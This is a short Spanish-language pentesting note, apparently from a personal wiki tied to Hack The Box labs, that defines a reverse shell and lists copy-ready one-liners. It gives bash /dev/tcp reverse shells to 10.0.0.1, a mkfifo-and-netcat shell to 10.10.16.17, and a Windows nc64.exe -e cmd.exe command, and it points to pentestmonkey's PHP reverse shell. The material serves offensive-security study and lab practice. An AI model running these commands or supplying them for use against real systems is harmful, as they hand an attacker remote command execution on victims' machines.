Es aquella que se obtiene cuando es la máquina víctima la que trata de establecer la conexión con nuestra máquina de atacante (que estaría en escucha). Es lo opuesto a una [[Bind shell]].

# Metodología

Si obtenemos una reverse shell mediante una web, tal vez se nos queda una tab del navegador cargando, para ello, podemos, desde la reverse shell mandarnos otra reverse shell y ponerla en segundo plano con `&`:

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 &
```

# Ejemplos

La mejor página para buscar reverse shells es [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

## Linux

### bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
### php

### Netcat

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.17 8443 >/tmp/f
```

## Windows

### nc64.exe

Utilizando el binario de netcat para windows x64 podemos mandarnos una reverse shell. Se utiliza en [[Archetype HTB]].

```powershell
.\nc64.exe -e cmd.exe <ip> <port>
```

Con el parámetro `-e` indicamos que queremos ejecutar un archivo al conectarnos, en este caso una cmd.